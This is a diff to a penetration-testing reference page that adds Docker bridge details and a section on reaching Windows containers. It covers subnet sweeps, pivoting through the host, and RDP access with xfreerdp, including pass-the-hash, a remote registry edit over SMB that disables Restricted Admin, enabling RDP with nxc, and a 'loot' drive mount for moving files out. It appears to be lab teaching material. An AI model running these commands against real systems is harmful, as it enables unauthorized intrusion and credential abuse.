@@ -69,7 +69,7 @@ systemd-detect-virt --container
     ```
   </Accordion>
   <Accordion title="Network and Neighbors">
-    Docker's default bridge puts containers on `172.17.0.0/16`. Other containers are often reachable here.
+    Docker's default bridge puts containers on `172.17.0.0/16`. User-defined bridges (from `docker-compose` or `docker network create`) get their own subnet: `172.18.0.0/16`, `172.19.0.0/16`, and so on. The `.1` address of each subnet is the Docker host. Other containers are often reachable here.
 
     ```bash wrap
     ip a
@@ -233,3 +233,82 @@ systemd-detect-virt --container
     ```
   </Accordion>
 </AccordionGroup>
+
+## Windows Containers
+
+Docker can run Windows containers, and labs often place one on a **non-default bridge** such as `172.19.0.0/16`. From a shell on the Linux host, `172.19.0.1` is the Docker host itself (the gateway) and the Windows container is usually the next address, `172.19.0.2`. It typically exposes SMB (445) and RDP (3389) on the bridge but nothing to the outside.
+
+```bash wrap
+# From the Linux host: list the docker networks and their subnets
+docker network ls
+docker network inspect bridge
+ip -br a                       # a 172.19.0.1/16 interface = a second bridge
+
+# Find the Windows container on the 172.19.0.0/16 bridge
+for i in $(seq 1 254); do ping -c1 -W1 172.19.0.$i &>/dev/null && echo "172.19.0.$i UP"; done
+nxc smb 172.19.0.2             # confirm Windows, grab hostname/domain
+```
+
+### Reaching It From Your Attacker Box
+
+`172.19.0.0/16` is only routable from the Linux host, so pivot through it. See [Ligolo](/pivoting/ligolo), [Chisel](/pivoting/chisel), [Proxychains](/pivoting/proxychains).
+
+```bash wrap
+# Ligolo: route the docker subnet through the agent, then connect directly
+sudo ip route add 172.19.0.0/16 dev ligolo
+
+# SSH local forward: bind the container's 3389 to your loopback
+ssh -L 3389:172.19.0.2:3389 $USER@$TARGET
+# then connect to 127.0.0.1
+
+# Chisel / SOCKS: wrap the client in proxychains
+proxychains xfreerdp3 /v:172.19.0.2 ...
+```
+
+### xfreerdp
+
+`xfreerdp3` is the v3 binary; older systems use `xfreerdp`. `/cert:ignore` is almost always needed against a container's self-signed cert.
+
+```bash wrap
+# Basic connection
+xfreerdp3 /u:$USER /p:$PASSWORD /v:172.19.0.2 /cert:ignore
+
+# Domain account, dynamic resolution, clipboard sharing
+xfreerdp3 /d:$DOMAIN /u:$USER /p:$PASSWORD /v:172.19.0.2 \
+  /cert:ignore /dynamic-resolution +clipboard
+
+# Mount a local folder as a drive — fastest way to move files in/out of the session
+xfreerdp3 /u:$USER /p:$PASSWORD /v:172.19.0.2 /cert:ignore \
+  /drive:loot,/tmp/loot        # shows up as \\tsclient\loot on the target
+
+# Pass-the-hash (target must allow Restricted Admin mode)
+xfreerdp3 /u:Administrator /pth:$NTHASH /v:172.19.0.2 /cert:ignore
+# Enable Restricted Admin first if needed (requires SMB admin):
+nxc smb 172.19.0.2 -u $USER -H $NTHASH -x 'reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f'
+
+# Test credentials without opening a window
+xfreerdp3 /u:$USER /p:$PASSWORD /v:172.19.0.2 /cert:ignore +auth-only
+
+# Read the password from stdin (keeps it out of history and the process list)
+xfreerdp3 /u:$USER /v:172.19.0.2 /cert:ignore /from-stdin
+
+# Useful extras
+#   /sec:nla | /sec:tls | /sec:rdp   force a security protocol
+#   /f                               fullscreen (Ctrl+Alt+Enter toggles)
+#   /size:1600x900   /w:1600 /h:900  window size
+#   +compression /bpp:8              low-bandwidth mode
+#   /timeout:20000                   raise connection timeout (ms) for laggy pivots
+#   /log-level:trace                 debug handshake / auth failures
+```
+
+<Warning>
+Through a SOCKS tunnel, RDP is fragile: add `/timeout:20000`, and if NLA fails during negotiation fall back to `/sec:tls`. A direct Ligolo route is far more stable than proxychains for interactive sessions.
+</Warning>
+
+### Enabling RDP If It's Not Listening
+
+If 3389 is closed on the container but you have SMB admin:
+
+```bash wrap
+nxc smb 172.19.0.2 -u $USER -p $PASSWORD -M rdp -o ACTION=enable
+```
